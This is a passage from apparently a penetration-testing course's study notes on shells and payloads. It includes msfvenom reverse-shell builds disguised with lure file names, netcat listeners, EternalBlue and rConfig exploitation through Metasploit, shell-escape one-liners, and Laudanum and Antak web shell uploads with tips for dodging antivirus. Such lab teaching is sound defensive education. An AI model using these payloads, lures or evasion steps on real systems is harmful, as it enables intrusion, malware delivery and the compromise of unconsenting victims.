- `linux/x86/shell/reverse_tcp` — Linux, x86 architecture, staged shell, reverse TCP
- `windows/dllinject/reverse_tcp` — Windows, DLL injection method, reverse TCP

The output is organized by OS (Linux, Windows, MacOS, mainframe, etc.) and allows identification of payloads suitable for specific targets.

---

### Staged vs. Stageless Payloads

**Staged Payloads:**  
A staged payload sends a small initial stage to the target that executes and then **calls back to the attack box** to download the rest of the payload over the network. This means the full payload is never written to disk at once. Staged payloads are identified in the name by **separate segments separated by `/`** after the shell type. Example: `linux/x86/shell/reverse_tcp` — the `/shell/` and `/reverse_tcp` are separate stages.

**Limitations of staged payloads:**
- Each stage occupies memory, leaving less space for the actual payload
- In low-bandwidth or high-latency environments, staged payloads can cause unstable sessions

**Stageless Payloads:**  
A stageless payload is sent **in its entirety** over the network in one go — there is no callback to retrieve additional components. Better for low-bandwidth environments and potentially better for evasion (less network traffic). Identified in the name by the shell type and network method being **combined**: `linux/zarch/meterpreter_reverse_tcp` — no separate `/stage/` segment.

**Quick Identification Rule:**

| Name | Type |
|---|---|
| `windows/meterpreter/reverse_tcp` | **Staged** (slash between meterpreter and reverse_tcp) |
| `windows/meterpreter_reverse_tcp` | **Stageless** (combined into one segment) |

---

### Building A Stageless Payload

#### Build It

**Full Command:**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

**Output:**
```
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

---

#### Call MSFvenom

```bash
msfvenom
```
Defines the tool being used to create the payload. MSFvenom is the combination of the old `msfpayload` and `msfencode` tools into a single utility.

---

#### Creating a Payload

```bash
-p
```
The `-p` flag tells MSFvenom to generate a **payload**. What follows `-p` is the payload name to generate.

---

#### Choosing the Payload based on Architecture

```bash
linux/x64/shell_reverse_tcp
```
Specifies the payload: **Linux** target OS, **x64** (64-bit) architecture, **stageless** shell (underscore-connected), using a **reverse TCP** connection. The `shell_reverse_tcp` part means the target will spawn `/bin/sh` and connect back to the attacker.

---

#### Address To Connect Back To

```bash
LHOST=10.10.14.113 LPORT=443
```
- `LHOST` — the IP address of the attacker's machine that the payload should connect back to
- `LPORT` — the port on the attacker's machine that will be listening for the connection (443 chosen to mimic HTTPS and avoid firewall blocks)

---

#### Format To Generate Payload In

```bash
-f elf
```
The `-f` flag specifies the **output format**. `elf` (Executable and Linkable Format) is the standard binary executable format for Linux systems. The generated file will be a valid Linux executable.

---

#### Output

```bash
> createbackup.elf
```
The `>` operator redirects the generated payload binary into a file named `createbackup.elf`. The file name is chosen to appear inconspicuous — something an IT admin might carelessly click on. You can name it anything to blend in with the target environment.

---

### Executing a Stageless Payload

Once created, the payload must be delivered to the target. Common delivery methods include:
- **Email** with the file as an attachment
- **Download link** on a website
- **Combined with a Metasploit exploit module** (requires internal network access)
- **Via flash drive** during an on-site physical penetration test

After placing the file on the target, a listener must be running on the attack box before the target executes it.

---

#### NC Connection

**Command (on attack box, before target executes the payload):**
```bash
sudo nc -lvnp 443
```

Starts a Netcat listener on port 443, ready to receive the reverse shell connection when the target runs the `.elf` file.

---

#### Connection Established

**Output after target executes the payload:**
```
Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
```

**Explanation:**  
Once the target user executes `createbackup.elf`, the payload runs and connects back to the attack box on port 443. The attacker's Netcat listener catches the connection and provides a shell. Commands like `env` and `ls` can now be run on the target. The `PWD` output confirms the payload was executed from the user's Downloads folder.

---

### Building a simple Stageless Payload for a Windows system

#### Windows Payload

**Command:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

**Output:**
```
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

**Differences from Linux payload:**
- `windows/shell_reverse_tcp` — Windows target (32-bit x86 architecture auto-selected)
- `-f exe` — generates a Windows `.exe` executable instead of an ELF binary
- File named `BonusCompensationPlanpdf.exe` — social engineering: designed to look like a PDF document about bonus compensation to entice a user to open it

The command structure is identical to the Linux payload command — only the OS, architecture, and format change.

---

### Executing a Simple Stageless Payload On a Windows System

Without AV encoding or encryption, this payload will likely be detected by Windows Defender and blocked immediately. This highlights the need for payload obfuscation in real engagements. If AV is disabled, the user double-clicking the file will trigger the payload. The attack box Netcat listener catches the shell:

```
Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
C:\Users\htb-student\Downloads>dir
```

The `dir` command lists the contents of the Downloads folder on the Windows target, confirming full interactive CMD shell access.

---

<a name="section-9"></a>
## Section 9 — Infiltrating Windows

### Overview

Microsoft Windows dominates both home and enterprise computing markets. With the expansion of Active Directory, cloud integrations, and Windows Subsystem for Linux (WSL), the Windows attack surface has grown significantly. Over 3,688 vulnerabilities were reported in Microsoft products in just the last five years. Penetration testers must be proficient in identifying and exploiting Windows vulnerabilities, and understanding these vulnerabilities also helps defenders secure their environments.

---

### Prominent Windows Exploits

| Vulnerability | Description |
|---|---|
| **MS08-067** | Critical patch for an SMB flaw affecting multiple Windows versions. Exploited by the Conficker worm and Stuxnet. Extremely easy to exploit when unpatched. |
| **EternalBlue (MS17-010)** | NSA exploit leaked by Shadow Brokers. Used in WannaCry and NotPetya ransomware. Exploits an SMBv1 flaw for remote code execution. Infected 200,000+ hosts in 2017. |
| **PrintNightmare** | RCE vulnerability in the Windows Print Spooler. Allows installation of a malicious printer driver to gain SYSTEM-level access with only valid credentials or low-privilege shell. Active through 2021. |
| **BlueKeep (CVE-2019-0708)** | RDP protocol RCE vulnerability affecting Windows 2000 through Server 2008 R2. Exploits a miss-called channel to gain code execution. |
| **Sigred (CVE-2020-1350)** | Flaw in DNS SIG resource record reading. Can grant Domain Admin privileges by affecting the domain's primary DNS server (usually the Domain Controller). |
| **SeriousSam (CVE-2021-36934)** | Exploits improper permissions on `C:\Windows\system32\config`. Non-privileged users can read the SAM database from Volume Shadow Copy backups, enabling credential dumping. |
| **Zerologon (CVE 2020-1472)** | Critical cryptographic flaw in Active Directory's Netlogon protocol (MS-NRPC). Allows an attacker to log into servers via NTLM and change account passwords with ~256 guesses — achievable in seconds. |

---

### Enumerating Windows & Fingerprinting Methods

Before attacking a Windows host, we should confirm it is indeed a Windows system. Multiple techniques can be used to fingerprint the OS.

---

#### Pinged Host

**Command:**
```bash
ping 192.168.86.39
```

**What It Does:**  
`ping` sends ICMP echo requests to the target and waits for replies. The **TTL (Time To Live)** value in the response is a key fingerprinting indicator.

**Example Output:**
```
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
```

**Explanation:**  
A TTL of **128** is the default for Windows hosts. Linux typically has a TTL of **64**. Because TTL decreases by 1 at each network hop, a received TTL of 128 (or close to it) strongly suggests a Windows host. Since most targets are within 20 hops, TTL differences between OS types remain identifiable.

---

#### OS Detection Scan

**Command:**
```bash
sudo nmap -v -O 192.168.86.39
```

**What Each Flag Does:**
- `sudo` — required for OS detection (uses raw packet crafting)
- `nmap` — invokes Nmap
- `-v` — verbose output (shows real-time port discoveries)
- `-O` — enables OS detection (fingerprints the target based on TCP/IP stack behaviour)
- `192.168.86.39` — the target IP

**Example Output:**
```
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
```

**Explanation:**  
Nmap compares the TCP/IP stack characteristics of the target against a database of OS fingerprints to determine the OS type and version. The result `Microsoft Windows 10 1709 - 1909` tells us the exact Windows version range. If scan results are poor, try `-A -Pn` for a more aggressive scan. Note: firewalls can obscure results — always use multiple methods.

---

#### Banner Grab to Enumerate Ports

**Command:**
```bash
sudo nmap -v 192.168.86.39 --script banner.nse
```

**What It Does:**
- `--script banner.nse` — loads the Nmap **banner** script, which attempts to connect to each open port and read any service banner returned

**Example Output:**
```
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0
```

**Explanation:**  
Banner grabbing retrieves service identification strings from open ports. In this example, ports 902 and 912 revealed VMware Authentication Daemon banners. This information can be used to search for known vulnerabilities in that specific service version. In real pentests, thorough enumeration across all open ports is essential.

---

### Bats, DLLs, & MSI Files, Oh My!

Windows hosts support multiple file types that can be weaponized as payloads. Understanding each type helps with choosing the right payload format for the delivery mechanism and target environment.

---

#### DLLs

A **Dynamic Linking Library (DLL)** is a shared library file used by Windows to provide code and data that multiple programs can use simultaneously. DLLs are modular, making applications easier to update. From an attack perspective, a malicious DLL can be injected into a running process (**DLL Injection**) or planted to replace a legitimate DLL a vulnerable application loads (**DLL Hijacking**). Both techniques can elevate privileges to SYSTEM level or bypass User Account Controls (UAC).

---

#### Batch

**Batch files** are text-based scripts (`.bat` extension) interpreted by the Windows CMD shell. They allow administrators to automate sequences of commands. As a payload, a batch file can: open network ports, execute reverse shell commands, enumerate system information, and relay data back to the attacker. Batch files are simple and widely compatible — they run on all modern Windows versions without requiring additional runtimes.

---

#### VBS

**VBScript (VBS)** is a lightweight scripting language based on Microsoft's Visual Basic. Historically used for client-side web scripting, VBS is now primarily used in **phishing attacks** and social engineering scenarios. It can be embedded in documents (such as Excel macros) or used to execute code when a user clicks a specific cell. Modern browsers have disabled VBS, but it still runs through the Windows Script Host (WSH), making it viable for phishing campaigns.

---

#### MSI

**MSI files** (`.msi`) are Windows Installer packages — installation databases that the Windows Installer service reads to install software. As an attacker payload, a crafted `.msi` file can be executed using `msiexec`, which may run with elevated privileges depending on the configuration. This can result in an elevated reverse shell being delivered. MSI files are especially useful because users and administrators frequently install software and may not question an MSI being run.

---

#### Powershell

**PowerShell** serves as both a shell environment and a scripting language in Windows. It is built on the .NET CLR and provides extensive access to Windows management features. As a payload delivery method, PowerShell offers: cmdlets for network operations, the ability to load scripts entirely in memory (fileless attacks), access to .NET objects for complex operations, and remote code execution capabilities. PowerShell is the most powerful and flexible Windows-native payload vehicle available.

---

### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

#### Payload Generation

| Resource | Description |
|---|---|
| **MSFVenom & Metasploit-Framework** | Versatile tool for enumeration, payload generation, exploitation, and post-exploitation. Functions as a Swiss Army knife. |
| **Payloads All The Things** | Repository of payload generation cheat sheets and general pentest methodology resources. |
| **Mythic C2 Framework** | Alternative Command and Control framework with unique payload generation capabilities. |
| **Nishang** | Collection of Offensive PowerShell implants and scripts for pentesters. |
| **Darkarmour** | Tool for generating obfuscated binaries to bypass Windows AV. |

---

#### Payload Transfer and Execution

| Method | Description |
|---|---|
| **Impacket** | Python toolkit for interacting with network protocols (psexec, SMB, Kerberos, WMI). Can also stand up an SMB server. |
| **Payloads All The Things** | Contains quick one-liners for transferring files between hosts. |
| **SMB** | Use SMB shares (including `C$` and `ADMIN$`) to transfer payloads between Windows hosts on the same network. |
| **Remote execution via MSF** | Metasploit exploit modules can build, stage, and execute payloads automatically. |
| **Other Protocols** | FTP, TFTP, HTTP/S — can all be used to upload payloads to target hosts depending on what services are running. |

---

### Example Compromise Walkthrough

#### Enumerate The Host

**Command:**
```bash
nmap -v -A 10.129.201.97
```

**What Each Flag Does:**
- `-v` — verbose mode (shows ports as they are discovered)
- `-A` — aggressive scan: OS detection + version detection + script scanning + traceroute
- `10.129.201.97` — the target IP

**Key Findings:**
```
80/tcp  open  http  Microsoft IIS httpd 10.0
445/tcp open  microsoft-ds  Windows Server 2016 Standard 14393
Computer name: SHELLS-WINBLUE
```

**Interpretation:**  
The target is running **Windows Server 2016** with IIS and SMB open. The hostname `SHELLS-WINBLUE` and the version `14393` provide strong indicators. Windows Server 2016 falls within the range affected by **EternalBlue (MS17-010)**. SMB on port 445 is the primary attack vector to investigate.

---

#### Search for and decide on an exploit path

**Step 1 — Use Metasploit's EternalBlue scanner:**
```bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

**Output:**
```
[+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64
```

**Explanation:**  
`auxiliary/scanner/smb/smb_ms17_010` is a Metasploit auxiliary module that checks whether the target is vulnerable to EternalBlue without actually exploiting it — it is purely a scanner. `set RHOSTS` sets the target IP, and `run` executes the check. The `[+]` result confirms the target is likely vulnerable.

---

#### Select Exploit & Payload, then Deliver

**Search for EternalBlue exploit:**
```bash
msf6 > search eternal
```

**Results (relevant):**
```
0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14  average  Yes
2  exploit/windows/smb/ms17_010_psexec            2017-03-14  normal   Yes
```

**Module selected:**
```bash
msf6 > use 2
```
Module `ms17_010_psexec` is chosen because it has had better reliability results. It uses the EternalRomance/EternalSynergy/EternalChampion chain.

---

#### Configure The Exploit & Payload

After selecting the module, review and set options:
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

Key required options:
- `RHOSTS` — target IP
- `LHOST` — attacker's IP for the reverse shell callback
- `LPORT` — attacker's listening port (default 4444)
- `SHARE` — set to `ADMIN$` (default)

Default payload auto-selected:
```
windows/meterpreter/reverse_tcp
```

---

#### Validate Our Options

**Command:**
```bash
show options
```

Before running any exploit, always verify that all required options are correctly set. Confirm that `RHOSTS`, `LHOST`, and `LPORT` match your actual network configuration. Required fields with no value will cause the exploit to fail.

---

#### Execute Attack, and Receive A Callback

**Command:**
```bash
exploit
```

**Output:**
```
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] Meterpreter session 1 opened (...) at 2021-09-27 18:58:00 -0400
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Explanation:**  
The exploit succeeded. `getuid` confirms the shell is running as **NT AUTHORITY\SYSTEM** — the highest privilege level on a Windows system. A SYSTEM-level Meterpreter session allows complete control: keylogging, credential dumping, process management, file access, and more.

---

#### Identify the Native Shell

**Command (inside Meterpreter):**
```bash
shell
```

**Output:**
```
Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
C:\Windows\system32>
```

**Explanation:**  
The `C:\Windows\system32>` prompt confirms we dropped into a **CMD shell** (`cmd.exe`). If it were PowerShell, the prompt would begin with `PS C:\`. Running `help` from within the shell also confirms which shell type is active. This system shell provides access to the full native command set of the Windows OS.

---

### CMD-Prompt and PowerShells for Fun and Profit

When landing on a Windows host, two shell options are available by default. Choosing the right one depends on what the task requires.

---

#### Use CMD when:
- The target host is **old** (Windows XP or earlier — PowerShell not available until Windows 7)
- Only **simple interactions** are needed
- Using simple **batch files**, `net` commands, or MS-DOS native tools
- **Execution policies** may block PowerShell scripts
- **Stealth** is important — CMD does not log command history, leaving fewer traces

---

#### Use PowerShell when:
- Using **cmdlets** or custom-built PowerShell scripts
- Interacting with **.NET objects** rather than plain text
- **Stealth is less of a concern**
- **Cloud-based services** are involved
- Scripts use **Aliases** or advanced PowerShell features
- Post-exploitation tasks require complex object manipulation

---

### WSL and PowerShell For Linux

**Windows Subsystem for Linux (WSL)** is a virtual Linux environment built into Windows hosts. It represents an emerging attack surface: malware has been observed using Python3 and Linux binaries to deliver payloads through WSL on Windows. Critically, network requests made from within WSL are **not parsed by the Windows Firewall or Windows Defender**, creating a blind spot for defenders. Similarly, **PowerShell Core** (cross-platform version) running on Linux can carry over standard PowerShell functions and has been used to evade AV and EDR detection. These attack vectors are advanced and evolving.

---

<a name="section-10"></a>
## Section 10 — Infiltrating Unix/Linux

### Overview

Over **70% of web servers run on Unix-based systems** (W3Techs study). Linux systems are therefore a primary target during external penetration tests. Many organizations host web applications on on-premises Linux servers, making them reachable from the internet. Gaining a shell on a Linux web server can allow pivoting into the internal network. Understanding how to attack Linux systems — through vulnerable web applications, exposed services, and misconfigured software — is an essential penetration testing skill.

---

### Common Considerations

Before attacking a Linux host, gather answers to these key questions:

- What **Linux distribution** is the system running? (CentOS, Ubuntu, Debian, etc.)
- What **shell and programming languages** are present? (Bash, Python, Perl, Ruby, etc.)
- What **function** does the system serve in the network? (Web server, database server, etc.)
- What **application** is the system hosting? (Apache, Nginx, rConfig, etc.)
- Are there any **known vulnerabilities** for this application or OS version?

These questions guide the selection of appropriate exploits, payloads, and post-exploitation techniques.

---

### Gaining a Shell Through Attacking a Vulnerable Application

#### Enumerate the Host

**Command:**
```bash
nmap -sC -sV 10.129.201.101
```

**What Each Flag Does:**
- `-sC` — runs default Nmap scripts (banner grabbing, service fingerprinting)
- `-sV` — version detection for services
- `10.129.201.101` — target IP

**Key Output:**
```
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4
80/tcp   open  http     Apache httpd 2.4.6 (CentOS) PHP/7.2.34
443/tcp  open  ssl/http Apache httpd 2.4.6 (CentOS) PHP/7.2.34
3306/tcp open  mysql    MySQL (unauthorized)
```

**Interpretation:**  
The target runs **Apache 2.4.6 with PHP 7.2.34** on **CentOS** — a classic LAMP stack. Multiple ports are open (HTTP, HTTPS, MySQL, FTP, SSH). Navigating to the IP in a browser reveals **rConfig v3.9.6**, a network configuration management tool used to automate configuration of routers, switches, and other network appliances.

---

#### Discovering a Vulnerability in rConfig

By examining the bottom of the rConfig login page, the version number `3.9.6` is visible. Search for it:

**Search terms:** `rConfig 3.9.6 vulnerability`

**Results:** Exploit-DB and other security resources reveal multiple vulnerabilities, including an **arbitrary file upload to Remote Code Execution (RCE)** vulnerability in rConfig 3.9.6. This is the path to gaining a shell.

---

#### Search For an Exploit Module

**Command (in msfconsole):**
```bash
msf6 > search rconfig
```

**Relevant Results:**
```
2  exploit/linux/http/rconfig_ajaxarchivefiles_rce   2020-03-11  good
3  exploit/unix/webapp/rconfig_install_cmd_exec      2019-10-28  excellent
```

If the specific module for rConfig 3.9.6 (`rconfig_vendors_auth_file_upload_rce`) does not appear, it can be found on Rapid7's GitHub. Search: `rConfig 3.9.6 exploit metasploit github`.

---

#### Locate

**Command:**
```bash
locate exploits
```

**What It Does:**  
`locate` searches a pre-built database of file paths on the local system for entries matching the keyword `exploits`. The output will include the Metasploit exploit module directories. On Parrot OS / Pwnbox, Metasploit exploit modules are stored at:

```
/usr/share/metasploit-framework/modules/exploits
```

Custom or downloaded exploit modules (`.rb` files — written in Ruby) should be placed in the appropriate subdirectory (e.g., `/usr/share/metasploit-framework/modules/exploits/linux/http/`) to be loaded by MSF. Keep MSF updated with: `apt update; apt install metasploit-framework`.

---

#### Using the rConfig Exploit and Gaining a Shell

##### Select an Exploit

**Command:**
```bash
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

Selects the rConfig authenticated file upload RCE exploit. Fill in all required options (target IP, LHOST, LPORT, etc.) using the `options` command and `set`.

---

##### Execute the Exploit

**Command:**
```bash
exploit
```

**Output:**
```
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable.
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Meterpreter session 1 opened (...) at 2021-09-27 13:49:34 -0400
```

**What Happened (step by step):**
1. MSF verified the rConfig version (3.9.6) is vulnerable
2. MSF authenticated to rConfig using default credentials
3. A PHP-based reverse shell payload file was uploaded to the server
4. The payload was triggered (executed on the server)
5. The uploaded file was deleted to clean up
6. A Meterpreter shell session was opened

---

##### Interact With the Shell

**Command (in Meterpreter):**
```bash
shell
```

**Output:**
```
Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
```

The `shell` command drops into a system-level shell on the Linux target. The working directory is `/home/rconfig/www/images/vendor` — where the payload was uploaded.

---

#### Spawning a TTY Shell with Python

After dropping into the system shell, there is no visible prompt — this is a **non-tty shell** (also called a "jail shell"). Non-tty shells have limited functionality: commands like `su`, `sudo`, and some interactive utilities will not work. This occurs because the shell was spawned by the `apache` user, which has no TTY configured in its environment variables.

**Command:**
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

**What It Does:**  
- `python -c` — runs a Python command inline
- `import pty` — imports the Python `pty` (pseudo-terminal) module
- `pty.spawn("/bin/sh")` — uses the pty module to spawn `/bin/sh` with a proper pseudo-terminal attached, which creates a full interactive TTY shell with a prompt

**Output:**
```
sh-4.2$ whoami
apache
```

We now have a proper interactive shell prompt (`sh-4.2$`) and can use `sudo`, `su`, and other commands that require a TTY environment.

---

<a name="section-11"></a>
## Section 11 — Spawning Interactive Shells

### Overview

When landing on a system with a limited (non-tty/jail) shell, Python may not always be present. There are several alternative methods to spawn a proper interactive shell. The methods below each use different tools or languages that may be present on the target system. `know that `/bin/sh` or `/bin/bash` can be swapped for any available shell interpreter on the target.

---

### /bin/sh -i

**Command:**
```bash
/bin/sh -i
```

**What It Does:**  
Directly executes the Bourne shell (`/bin/sh`) in **interactive mode** (`-i`). This forces the shell to behave as if it is connected to a terminal, enabling job control and prompt display. If a full TTY is not available, this may still yield a usable prompt.

**Output:**
```
sh: no job control in this shell
sh-4.2$
```

---

### Perl To Shell

**Command 1 (one-liner):**
```bash
perl -e 'exec "/bin/sh";'
```

**Command 2 (from inside a script):**
```bash
perl: exec "/bin/sh";
```

**What It Does:**  
`perl -e` executes a Perl code string inline. `exec "/bin/sh"` replaces the current Perl process with `/bin/sh`, spawning an interactive shell. The second form is used when Perl is already running a script and a shell is needed from within that script.

---

### Ruby To Shell

**Command (from inside a script):**
```bash
ruby: exec "/bin/sh"
```

**What It Does:**  
In Ruby, `exec` replaces the current Ruby process with the specified program — here, `/bin/sh`. Like the Perl method, this must be run from within a Ruby script context. Ruby is sometimes present on servers running Ruby on Rails or other Ruby-based web frameworks.

---

### Lua To Shell

**Command (from inside a script):**
```bash
lua: os.execute('/bin/sh')
```

**What It Does:**  
`os.execute()` is a Lua function that passes a string to the OS shell for execution. By passing `/bin/sh`, it spawns a Bourne shell. This must be run from within a Lua script. Lua is sometimes found on embedded systems and some Linux servers.

---

### AWK To Shell

**Command:**
```bash
awk 'BEGIN {system("/bin/sh")}'
```

**What It Does:**  
`awk` is a pattern scanning and text processing tool available on virtually all Unix/Linux systems. The `BEGIN` block executes before any input is processed. `system("/bin/sh")` calls the system function from within AWK to spawn a shell. This is useful when AWK is available and no other method works — AWK is nearly always present on Unix/Linux systems.

---

### Using Find For A Shell

**Command 1:**
```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

**What It Does:**  
`find /` searches the entire filesystem starting from root. `-name nameoffile` looks for a file with that name (any file name can be used, even one that doesn't exist — find will still execute `-exec`). `-exec` runs the specified command for each found file. Here it runs AWK to spawn a shell. `\;` terminates the `-exec` argument.

**Command 2:**
```bash
find . -exec /bin/sh \; -quit
```

**What It Does:**  
Simpler version: `-exec /bin/sh \;` directly spawns `/bin/sh` for each file found. `-quit` stops `find` after the first match. This is a fast method to drop into a shell using `find`.

---

### Vim To Shell

**Command 1:**
```bash
vim -c ':!/bin/sh'
```

**What It Does:**  
Opens `vim` and immediately executes a Vim command (via `-c`). `:!` in Vim executes a shell command. `:!/bin/sh` spawns an interactive shell from within Vim. Useful in very restricted environments where Vim is the only available editor.

---

### Vim Escape

**Commands (from within vim):**
```
vim
:set shell=/bin/sh
:shell
```

**What It Does:**  
1. Open `vim`
2. `:set shell=/bin/sh` — configures Vim to use `/bin/sh` as the shell for shell commands
3. `:shell` — launches the shell configured in step 2

This drops you into a shell from within a running Vim session. Useful when Vim is already open or when direct shell invocation is restricted.

---

### Execution Permissions Considerations

Before attempting privilege escalation, always check what permissions and capabilities the current account has.

---

#### Permissions

**Command:**
```bash
ls -la <path/to/fileorbinary>
```

**What It Does:**  
`ls -la` lists files and directories with **long format** (`-l`) and **shows hidden files** (`-a`). For a specific file or binary, it shows:
- File type (regular file, directory, symbolic link)
- Permissions (read/write/execute for owner, group, others)
- Owner and group
- File size and last modified date

Knowing which binaries can be executed by the current user can reveal privilege escalation paths (e.g., if a SUID binary is present).

---

#### Sudo -l

**Command:**
```bash
sudo -l
```

**What It Does:**  
Lists the commands that the current user is permitted to run using `sudo` (super user do). The output shows:
- What commands can be run as root (or other users)
- Whether a password is required (`NOPASSWD` means no password needed)

**Example Output:**
```
User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

**Explanation:**  
`NOPASSWD: ALL` means the `apache` user can run **any command as root without a password** — this is a critical privilege escalation vulnerability. This command requires a **stable interactive shell (TTY)** to return output; it will not work in a non-tty shell.

---

<a name="section-12"></a>
## Section 12 — Introduction to Web Shells

### Overview

Web servers power the majority of the internet. Modern software, entertainment, and business tools are browser-based. As a result, web applications are increasingly a primary target during penetration tests — especially external assessments where most services are well-hardened except for web applications. File upload vulnerabilities, SQL injection, RFI/LFI, command injection, and password spraying against web portals are common initial access paths. During an external test, gaining a foothold often means getting into a web application first.

---

### What is a Web Shell?

A **web shell** is a browser-based shell session that allows interaction with the underlying operating system of a web server through the web browser. Web shells are typically short scripts (PHP, ASPX, JSP, etc.) uploaded to the server that execute commands received via HTTP requests and return output in the browser response. To gain a web shell, a file upload vulnerability or web application misconfiguration must first be identified. Web shells are primarily used as the **initial foothold** on a web server and are often then leveraged to establish a more stable reverse shell for persistent access. Some web applications auto-delete uploaded files after a set time, making web shells potentially temporary. The following sections cover multiple web shell types and their practical use.

---

<a name="section-13"></a>
## Section 13 — Laudanum, One Webshell to Rule Them All

### Overview

**Laudanum** is a repository of ready-made injectable web shell files for multiple web application languages: ASP, ASPX, JSP, PHP, and more. It provides reverse shell capability, browser-based command execution, and other features. Laudanum is pre-installed on **Parrot OS** and **Kali Linux**. For other distributions, it must be downloaded separately. It is a staple tool for any penetration tester targeting web applications. Files in Laudanum can generally be copied and deployed as-is, except for shell files which require modification (adding the attacker's IP) before use.

---

### Working with Laudanum

Laudanum files are located at:
```
/usr/share/laudanum/
```

Subdirectories include: `aspx/`, `jsp/`, `php/`, `asp/`, and others — organized by web language. For most files, copy and deploy directly. For shell files, always edit first to insert your attacking host IP into the `allowedIps` variable. Before using any file, **read the contents and comments** to understand what the file does and ensure it's configured correctly. Removing comments and ASCII art from the file before uploading can help avoid signature-based AV/IDS detection.

---

### Laudanum Demonstration

#### Move a Copy for Modification

**Command:**
```bash
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

**What It Does:**  
`cp` copies the Laudanum ASPX shell file from the read-only system directory to a writable location (`/home/tester/demo.aspx`) where it can be safely edited. Never edit files directly in `/usr/share/` — always copy first.

---

#### Modify the Shell for Use

Open `demo.aspx` in a text editor and locate **line 59**. Add your attacker IP to the `allowedIps` array:

```csharp
string[] allowedIps = new string[] { "10.10.14.12" };
```

**Why This Matters:**  
The allowedIps array restricts which IP addresses can interact with the web shell. This is a security control built into Laudanum to prevent others from using your shell during an engagement. Also:
- Remove the ASCII art banner at the top
- Remove comments that could trigger AV/IDS signatures
- Save the modified file

---

#### Take Advantage of the Upload Function

Navigate to the target web application (e.g., `status.inlanefreight.local`) and locate the file upload function at the bottom of the page. Select the modified `demo.aspx` file and click Upload. If successful, the application will print the path where the file was saved.

**Note:** The `/etc/hosts` file on your attack box must have an entry for the target:
```
<target_ip>  status.inlanefreight.local
```

---

#### Navigate to Our Shell

After upload, browse to the shell's location. For this web application, files upload to the `\\files\` directory:

```
status.inlanefreight.local\\files\demo.aspx
```

The browser automatically normalizes this to:
```
status.inlanefreight.local//files/demo.aspx
```

The shell interface provides a `cmd /c` input field where commands can be submitted.

---

#### Shell Success

After navigating to the web shell, commands can be executed. For example:

```
systeminfo
```

**Output (in browser):**  
Shows the Windows host name, OS version, manufacturer, system type, processor, memory, and network adapter info. This confirms full command execution on the underlying Windows OS through the browser-based web shell.

---

<a name="section-14"></a>
## Section 14 — Antak Webshell

### ASPX and a Quick Learning Tip

**ASPX (Active Server Page Extended)** is a file type written for Microsoft's **ASP.NET Framework**. Web forms in ASPX allow users to input data; the server processes it and returns HTML. From an attack perspective, an ASPX web shell exploits this by executing system commands on the server and returning output in the browser. A great supplementary learning resource for ASPX web shells is **IPPSEC's blog** at `ippsec.rocks` — it indexes timestamps in his YouTube walkthroughs by keyword. Searching `aspx` on the site leads directly to demonstrations of ASPX shell techniques in retired HTB machines.

---

### ASPX Explained

**How ASPX Works:**  
When a user sends an HTTP request to an ASPX page, the ASP.NET framework on the web server processes the page's code server-side and generates an HTML response. An ASPX web shell exploits this by embedding system command execution logic within the ASPX file. Commands are passed as HTTP parameters (GET or POST), executed on the server, and the output is returned in the HTTP response. This gives complete control over the underlying Windows OS through a simple browser interface.

---

### Antak Webshell

**Antak** is a web shell written in ASP.NET, included in the **Nishang** offensive PowerShell toolkit. It uses PowerShell to interact with the Windows host, making it far more capable than basic ASPX command runners. The Antak UI is themed to resemble a PowerShell console. Key capabilities include:
- Executes each command as a **new process** on the target
- Can execute **PowerShell scripts loaded entirely in memory**
- Can **encode and execute** commands (helps with evasion)
- Supports **file upload and download**
- Can **execute SQL queries** if a connection string is provided

---

### Working with Antak

Antak files are located at:
```
/usr/share/nishang/Antak-WebShell/
```

**Command to list files:**
```bash
ls /usr/share/nishang/Antak-WebShell
```

**Output:**
```
antak.aspx  Readme.md
```

`antak.aspx` is the web shell file. `Readme.md` contains usage documentation.

---

### Antak Demonstration

#### Move a Copy for Modification

**Command:**
```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

**What It Does:**  
Copies `antak.aspx` to `/home/administrator/Upload.aspx` so it can be safely modified. Never edit the original in `/usr/share/`.

---

#### Modify the Shell for Use

Open `Upload.aspx` and locate **line 14**. Set access credentials:

```csharp
